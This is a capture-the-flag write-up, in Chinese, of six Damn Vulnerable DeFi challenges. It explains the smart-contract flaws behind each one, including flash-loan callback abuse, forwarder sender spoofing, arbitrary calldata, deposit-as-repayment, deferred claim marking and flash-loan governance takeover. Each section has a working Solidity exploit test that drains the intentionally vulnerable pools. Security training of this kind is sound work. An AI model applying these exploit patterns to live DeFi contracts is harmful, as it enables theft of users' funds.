## Damn Vulnerable DeFi Writeup [SunSec]


### Unstoppable

題目: 
有一個代幣化的金庫，存入了100萬個DVT代幣。該金庫提供免費的閃電貸款，直到寬限期結束。為了在完全無需許可前捕捉任何錯誤，開發者決定在測試網中進行實時測試。還有一個監控合約，用來檢查閃電貸款功能的運行狀況。從餘額為10個DVT代幣開始，展示如何使金庫停止運行。必須讓它停止提供閃電貸款。

過關條件:
- 讓 flashLoan 功能失效

解題:
只要 transfer token 給這個合約就可以讓 totalSupply != balanceBefore 讓閃電貸款失效。

```
 if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); 
```

[POC:](./Writeup/SunSec/damn-vulnerable-defi/test/unstoppable/Unstoppable.t.sol) 
```
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 123);   
    }
```



### Naive Receiver

題目: 
有一個資金池，餘額為1000 WETH，並提供閃電貸款。它收取固定費用為1 WETH。該資金池通過整合無需許可的轉發合約，支持元交易。一名使用者部署了一個餘額為10 WETH的範例合約。看起來它可以執行WETH的閃電貸款。所有資金都面臨風險！將使用者和資金池中的所有WETH救出，並將其存入指定的recovery賬戶。

過關條件:
- 必須執行兩次或更少的交易。確保 vm.getNonce(player) 小於等於2
- 確保 weth.balanceOf(address(receiver)) 為 0
- 確保 weth.balanceOf(address(pool)) 為 0
- 確保 weth.balanceOf(recovery) 等於 WETH_IN_POOL + WETH_IN_RECEIVER = 1010 ETH。

解題:
- NaiveReceiverPool 繼承 Multicall, IERC3156FlashLender 
[ERC-3156](https://eips.ethereum.org/EIPS/eip-3156): 閃電貸模組和允許閃電貸的 {ERC20} 擴充.
- FlashLoanReceiver 題目初始有10ETH,每次接收的 Flashloan 會支付1ETH手續費給 Pool. 但問題在於 onFlashLoan 沒有檢查發起 Flashloan是不是授權的來源. 所以我們只要發送10次 Flashloan 然後 amount 帶入0. 就可以把FlashLoanReceiver的10ETH轉走. 但是題目要求 Nonce 要小於2. 在前面有提到 NaiveReceiverPool 繼承 Multicall.  所以我們可以透過Multicall執行一次交易操作10次Flashloan就可以滿足 Nonce 小於2.
- 再來要想辦法把 NaiveReceiverPool 初始的1000ETH轉走. 從合約中可以看到唯一可以把資產轉走的function 是 withdraw. 可以發現到 _msgSender 需滿足 msg.sender == trustedForwarder && msg.data.length >= 20. 就可以返回最後20bytes 地址. 這邊是可以操控的.
- 再來是滿足 msg.sender == trustedForwarder. 這裡就要透過 forwarder 執行 meta-transaction.  

```
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
            //bytes20：將 msg.data 中最後 20 個字節轉換為 address 類型
        } else {
            return super._msgSender();
        }
    }

```
[POC](./Writeup/SunSec/damn-vulnerable-defi/test/naive-receiver/NaiveReceiver.t.sol) : 
```
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            callData,
            1 days
        );
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```

### Truster

題目: 
越來越多的借貸池提供閃電貸款。在這個情況下，一個新的池子已經啟動，提供免費的 DVT 代幣閃電貸款。該池子持有 100 萬個 DVT 代幣。而你什麼都沒有。要通過這個挑戰，你需要在一筆交易中拯救池子中的所有資金，並將這些資金存入指定的恢復賬戶。

過關條件:
- 只能執行1筆交易
- 救援資金發送至 recovery 帳戶

解題:
- 在 floashLoan 中可以看到 target.functionCall(data); 可以執行任意calldata且target的地址可控. 可直接執行任意指令.

[POC](./Writeup/SunSec/damn-vulnerable-defi/test/truster/Truster.t.sol) : 
```
    function test_truster() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(pool), address(token),address(recovery));
    }
    
 contract Exploit {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address recoveryAddress) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, address(recoveryAddress), TOKENS_IN_POOL);
    }
}
```

### Side Entrance

題目: 一個出乎意料的簡單池子允許任何人存入ETH，並隨時提取。該池子已經有1000 ETH的餘額，並提供免費的閃電貸款來推廣他們的系統。你開始時有1 ETH的餘額。通過將池子裡的所有ETH救出並存入指定的 Recovery 錢包來完成挑戰。

過關條件:
- 池子的餘額必須為0.
- 指定的 Recovery 錢包中的餘額必須等於池子中原本的ETH數量（即 ETHER_IN_POOL）.
解題:
- flashLoan 採用非標準用法, 判斷有沒有repay只是看池子的餘額 if (address(this).balance < balanceBefore). 
- 所以只要透過 flashLoan借款出來, 再透過deposit存回去. 就代表repay了. 然後你在合約同時有存款證明, 可執行 withdraw 就可以把$$轉出去了.

[POC](./Writeup/SunSec/damn-vulnerable-defi/test/SideEntrance/SideEntrance.t.sol) : 
```
    function test_sideEntrance() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(address(pool), recovery, ETHER_IN_POOL);
        exploiter.attack();
    }
contract Exploit{
    SideEntranceLenderPool public pool;
    address public recovery;
    uint public exploitAmount;
    constructor(address _pool, address _recovery, uint _amount){  
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }
    function attack() external returns(bool){
        pool.flashLoan(exploitAmount);
        pool.withdraw();
        payable(recovery).transfer(exploitAmount);
    }
    function execute() external payable{
        pool.deposit{value:msg.value}();
    }
    receive() external payable{}
}

```
### The Rewarder
題目: 一個合約正在分發Damn Valuable Tokens和WETH作為獎勵。要領取獎勵，用戶必須證明自己在選定的受益者名單中。不過不用擔心燃料費，這個合約已經過優化，允許在同一筆交易中領取多種代幣。Alice已經領取了她的獎勵。你也可以領取你的獎勵！但你發現這個合約中存在一個關鍵漏洞。儘可能多地從這個分發者手中拯救資金，將所有回收的資產轉移到指定的 Recovery 錢包中。

過關條件:
- 分發者合約中的剩餘DVT數量必須少於1e16（也就是0.01 DVT），僅允許留下極少量的「Dust」。
- 分發者合約中的剩餘WETH數量必須少於1e15（也就是0.001 WETH），僅允許留下極少量的「Dust」。
- 指定Recovery 錢包中的DVT數量必須等於總分發DVT數量（TOTAL_DVT_DISTRIBUTION_AMOUNT）減去Alice已經領取的DVT數量（ALICE_DVT_CLAIM_AMOUNT）以及分發者合約中剩餘的DVT數量。
- 指定Recovery 錢包中的WETH數量必須等於總分發WETH數量（TOTAL_WETH_DISTRIBUTION_AMOUNT）減去Alice已經領取的WETH數量（ALICE_WETH_CLAIM_AMOUNT）以及分發者合約中剩餘的WETH數量。

解題:
- 基於 Merkle proofs 和 bitmaps 代幣分配合約
- REF: [Bitmaps & Merkle Proofs](https://x.com/DegenShaker/status/1825835855140868370)
- 合約中可以發現在 claimRewards 中, 更新用戶是不是有領過reward是透過 _setClaimed().
- 因為 claimRewards支援array, 可以一個transaction執行多次claim. 並在最後一個claim才更新用戶claimreward紀錄.
- player 的地址, index為188
```
            // for the last claim
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
```
[POC](./Writeup/SunSec/damn-vulnerable-defi/test/the-rewarder/TheRewarder.t.sol) : 
```
   function test_theRewarder() public checkSolvedByPlayer {
        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /
            PLAYER_DVT_CLAIM_AMOUNT;
        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT /
            PLAYER_WETH_CLAIM_AMOUNT;
        uint totalTxCount = dvtTxCount + wethTxCount;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        console.log(totalTxCount);
        Claim[] memory claims = new Claim[](totalTxCount);

        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_DVT_CLAIM_AMOUNT,
                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(dvtLeaves, 188) //player at index 188
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_WETH_CLAIM_AMOUNT,
                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(wethLeaves, 188)  //player at index 188
                });
            }
        }
        //multiple claims
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
    
```

### Selfie

題目: 一個新的貸款池已經上線！現在它提供DVT代幣的閃電貸款服務。這個池子還包括一個精巧的治理機制來控制它。這能出什麼問題呢，對吧？你開始時沒有任何DVT代幣餘額，而這個池子中有150萬的資金面臨風險。將池子中的所有資金救出並存入指定的回收賬戶，完成這項挑戰。

過關條件:
- 池子的DVT餘額必須為0.
- 指定的 Recovery 錢包中的餘額必須等於池子中原本的DVT數量（即 TOKENS_IN_POOL）.

解題:
- SelfiePool 合約中有一個 function emergencyExit() 可以把合約中所有餘額轉移. 但需要滿足 onlyGovernance 權限.
- 跟進 SimpleGovernance 合約可以發現可以透過 queueAction 發起一個提案, 且data可以控制. 那就可以透過這個方式去執行 emergencyExit().
- 要執行 queueAction 要通過 _hasEnoughVotes 檢查, DamnValuableVotes 繼承 ERC20Votes, 所以借貸到的DVT需要delete受投票權給自己, 需要持有總發行量的一半投票權才能發起提案.
- 解題流程: Flashloan -> delegate ->發起提案 queueAction -> repay -> executeAction

[POC](./Writeup/SunSec/damn-vulnerable-defi/test/selfie/selfie.t.sol) : 
```
    function test_selfie() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(
            address(pool),
            address(governance),
            address(token)
        );
        exploiter.exploitSetup(address(recovery));
        vm.warp(block.timestamp + 2 days);
        exploiter.exploitCloseup();
    }

contract Exploit is IERC3156FlashBorrower{
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableToken;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    constructor(
        address _selfiePool, 
        address _simpleGovernance,
        address _token
    ){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        damnValuableToken.delegate(address(this));
        uint _actionId = simpleGovernance.queueAction(
            address(selfiePool),
            0,
            data
        );
        actionId = _actionId;
        IERC20(token).approve(address(selfiePool), amount+fee);
        return CALLBACK_SUCCESS;
    }

    function exploitSetup(address recovery) external returns(bool){
        uint amountRequired = 1_500_000e18;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amountRequired, data);
    }
    function exploitCloseup() external returns(bool){
        bytes memory resultData = simpleGovernance.executeAction(actionId);
    }
}
```

